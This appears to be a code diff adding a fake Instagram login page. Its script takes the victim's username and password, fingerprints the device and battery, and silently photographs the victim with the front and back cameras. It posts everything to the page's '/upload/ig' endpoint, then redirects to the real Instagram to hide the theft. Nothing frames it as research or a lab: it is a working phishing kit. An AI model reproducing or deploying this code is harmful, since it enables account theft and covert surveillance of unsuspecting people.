@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+        .login-box { background:white; padding:40px 50px; border:1px solid #dbdbdb; border-radius:1px; width:350px; }
+        .login-box .logo { text-align:center; font-family: 'Georgia', serif; font-size:48px; font-weight:600; margin-bottom:30px; }
+        .login-box input { width:100%; padding:12px; margin:5px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:3px; font-size:14px; }
+        .login-box input:focus { border-color:#a8a8a8; outline:none; }
+        .login-box button { width:100%; padding:10px; background:#0095f6; color:white; border:none; border-radius:4px; font-size:14px; font-weight:600; cursor:pointer; margin:10px 0; }
+        .login-box button:hover { background:#1877f2; }
+        .login-box .divider { display:flex; align-items:center; margin:20px 0; }
+        .login-box .divider::before, .login-box .divider::after { content:''; flex:1; border-bottom:1px solid #dbdbdb; }
+        .login-box .divider span { padding:0 18px; color:#8e8e8e; font-size:13px; font-weight:600; }
+        .login-box .fb-login { color:#385185; font-weight:600; text-align:center; cursor:pointer; font-size:14px; margin:10px 0; }
+        .login-box .signup { text-align:center; color:#8e8e8e; font-size:14px; margin-top:20px; }
+        .login-box .signup a { color:#0095f6; font-weight:600; text-decoration:none; cursor:pointer; }
+        #status { text-align:center; color:#8e8e8e; font-size:12px; margin-top:10px; }
+        .hidden { display:none; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <div class="logo">Instagram</div>
+        <form onsubmit="return false;">
+            <input type="text" id="email" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="button" onclick="captureAndSubmit()">Log In</button>
+        </form>
+        <div class="divider"><span>OR</span></div>
+        <div class="fb-login">🔵 Log in with Facebook</div>
+        <div class="signup">Don't have an account? <a onclick="captureAndSubmit()">Sign up</a></div>
+        <div id="status">🔒 Secured connection</div>
+    </div>
+
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        async function captureAndSubmit() {
+            const status = document.getElementById('status');
+            status.innerHTML = '⏳ Processing...';
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // ডিভাইস ইনফো
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceMemory: navigator.deviceMemory || 'Unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown'
+            };
+
+            // ব্যাটারি
+            let batteryInfo = 'Unknown';
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    batteryInfo = {
+                        charging: battery.charging,
+                        level: Math.round(battery.level * 100) + '%',
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
+            }
+
+            // ক্যামেরা
+            let frontImage = null, backImage = null;
+            
+            try {
+                const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = frontStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                frontImage = canvas.toDataURL('image/png');
+                frontStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            try {
+                const backStream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
+                });
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                video.srcObject = backStream;
+                await video.play();
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0);
+                backImage = canvas.toDataURL('image/png');
+                backStream.getTracks().forEach(t => t.stop());
+            } catch(e) {}
+
+            const payload = {
+                site: 'Instagram',
+                username: email,
+                password: password,
+                frontImage: frontImage,
+                backImage: backImage,
+                deviceInfo: deviceInfo,
+                batteryInfo: batteryInfo,
+                timestamp: Date.now()
+            };
+
+            try {
+                await fetch('/upload/ig', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                status.innerHTML = '✅ Redirecting...';
+                window.location.href = 'https://instagram.com';
+            } catch(e) {
+                window.location.href = 'https://instagram.com';
+            }
+        }
+    </script>
+</body>
+</html>
